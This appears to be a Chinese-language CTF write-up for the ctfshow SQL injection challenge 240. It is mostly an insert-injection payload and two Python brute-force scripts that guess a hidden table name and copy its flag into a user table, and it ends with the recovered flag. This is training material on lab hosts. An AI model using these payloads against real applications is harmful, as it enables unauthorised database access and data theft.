# ctfshow-sql240



##### 参考链接

其他大佬链接

feng  https://blog.csdn.net/rfrder/article/details/113759746

Je3    https://blog.csdn.net/jvkyvly/article/details/115458909

Y4	 https://blog.csdn.net/solitudi/article/details/110144623





 查询语句 

```
  //插入数据
  $sql = "insert into ctfshow_user(username,pass) value('{$username}','{$password}');";
```



 返回逻辑 

```
  //过滤空格 or sys mysql



Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写
```





```mysql
直接猜表名

表名 flag*****

insert注入，直接闭合单引号，然后自己构造查询语句，把查询的结果insert到表里

注入点api/insert.php


username=1',database())#&password=123456
倒序查找内容
ctfshow_web



import requests
url_insert="http://517b800b-509d-4bc2-950e-559745adb2ce.chall.ctf.show:8080/api/insert.php"

for v1 in "ab":
    for v2 in "ab":
        for v3 in "ab":
            for v4 in "ab":
                for v5 in "ab":
                    v="flag"+v1+v2+v3+v4+v5
                    data={
                        'username':"1',(select(group_concat(flag))from({})))#".format(v),
                        'password':'1'
                    }
                    r=requests.post(url=url_insert,data=data)
                    
                    
                    
跑完脚本直接网页查看

ctfshow{6a3b5850-a0af-4acd-b923-38230f8b6e28}




y4大佬脚本

"""
Author:Y4tacker
"""
import random
import requests

url = "http://35963b4d-3501-4bf2-b888-668ad24e1bc5.chall.ctf.show"
url_insert = url + "/api/insert.php"
url_flag = url + "/api/?page=1&limit=1000"


# 看命函数
def generate_random_str():
    sttr = 'ab'
    str_list = [random.choice(sttr) for i in range(5)]# 列表推导式
    random_str = ''.join(str_list)
    return random_str


while 1:
    data = {
        'username': f"1',(select(flag)from(flag{generate_random_str()})))#",
        'password': ""
    }
    r = requests.post(url_insert, data=data)
    r2 = requests.get(url_flag)
    if "flag" in r2.text:
        for i in r2.json()['data']:
            if  "flag" in i['pass']:
                print(i['pass'])
                break
        break

```























